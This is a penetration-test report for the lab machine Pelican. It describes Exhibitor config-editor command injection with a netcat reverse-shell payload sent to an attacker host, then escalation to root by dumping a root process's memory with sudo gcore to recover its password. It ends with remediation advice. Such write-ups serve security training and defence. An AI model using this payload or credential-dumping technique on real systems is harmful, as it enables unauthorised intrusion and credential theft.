# HTB Pelican - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-5-2

---

## 0. Lesson Learned

Sometimes it really is that simple. If its working, go with it.

---

## 1. Executive Summary

An external penetration test was conducted against the target system *Pelican*. The assessment resulted in full system compromise, including root-level access, by chaining multiple weaknesses: a publicly exposed vulnerable web user interface, followed by abuse of misconfigured sudo permissions allowing memory dumping of a privileged process and recovery of root credentials.

---

## 2. Scope

- **Target:** 192.168.244.98
- **Environment:** Proving Grounds Practice Pelican
- **Testing Window:** 2026-3-2
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-scan was conducted with Nmap:

```
nmap -p- -sCV 192.168.244.98 -T4 -oA pelican_initial
```

Revealing many services:

- 22/tcp - ssh - OpenSSH 7.9p1 Debian
- 139/tcp - netbios-ssn - Samba smbd 3.X - 4.X
- 445/tcp - netbios-ssn - Samba smbd 4.9.5-Debian
- 631/tcp - ipp - CUPS 2.2 - Forbidden CUPS v2.2.10 title
- 2181/tcp - zookeeper - Zookeeper 3.4.6 - Built in 2014
- 2222/tcp - ssh - OpenSSH 7.9p1 Debian
- 8080/tcp - http - Jetty 1.0 - 404 Error
- 8081/tcp - http - nginx 1.14.2 - did not follow redirect
- 39605/tcp - java-rmi - Java RMI

---

## 5. Enumeration

### Web Enumeration

Among the discovered services, the Exhibitor web interface on port 8081 was identified as unauthenticated and exposed administrative functionality.

HTTP Port 8081 was investigated and the redirect followed:

```
http://192.168.244.98:8080/exhibitor/v1/ui/index.html
```

This revealed an Exhibitor for Zookeeper v1.0 web user interface.

---

## 6. Initial Access

The Exhibitor for ZooKeeper web interface reported version 1.0. Public documentation indicates that the Config editor command injection vulnerability affects versions 1.0.9 through 1.7.1. The vulnerable functionality was present and successfully exploited by altering the `java.env script` field:

```
$(/bin/nc -e /bin/sh <attacker-ip> <listener-port> &)
```

The reverse shell was caught with netcat:

```
nc -lnvp <listener-port>
```

This resulted in a low-level reverse shell as `charles`.

---

## 7. Post-Exploitation

Manual version enumeration, SUID binary enumeration, and linPEAS execution were performed.

LinPEAS suggested an outdated sudo version 1.8.27 which could be vulnerable to privilege escalation.

Sudo permissions were investigated:

```
sudo -l
```

This revealed user `charles` was permitted to run `/usr/bin/gcore` as sudo without a password. `gcore` is used to generate core dumps form running processes and the files can often contain sensitive information such as passwords.

---

## 8. Privilege Escalation

Because `gcore` can dump memory of running processes when executed with elevated privileges, root-owned processes were targeted:

```
ps aux
```

This revealed a running root process `/usr/bin/password-store`. This process was dumped with `gcore`:

```
sudo gcore 513
```

And the core dump file was examined:

```
strings core.513
```

Revealing the password `ClogKingpinInning731`. The user was switched to `root` using this leaked credential:

```
su root
```

This resulted in root shell access.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
cat /home/charles/local.txt
```

**Root Flag**: *REDACTED*

```
cat /root/proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### Public Facing Web Application with Vulnerable Services Allowing Remote Code Execution

**Severity:** Critical - This vulnerability allowed unauthenticated attackers to execute arbitrary commands as a system user, allowing low-level system access.

**Recommendation:** Restrict Exhibitor UI to localhost or authenticated users. Upgrade or remove ZooKeeper/Exhibitor components. Isolate software that cannot be upgraded to non-vulnerable version. Perform regular scanning of services for outdated software. 

### Sensitive Credential Exposure via Misconfigured Sudo Permissions

**Severity:** Critical - This misconfiguration allowed disclosure of sensitive credentials, leading directly to full system compromise.

**Recommendation:** Apply principle of least privilege. Remove `NOPASSWD` sudo access for `gcore`. Check running processes for sensitive file disclosure.

---

## 11. Appendix

Exhibitor Web UI - Remote Code Execution - 
[https://www.exploit-db.com/exploits/48654](https://www.exploit-db.com/exploits/48654)

gcore Sudo Explanation -
[https://gtfobins.org/gtfobins/gcore/](https://gtfobins.org/gtfobins/gcore/)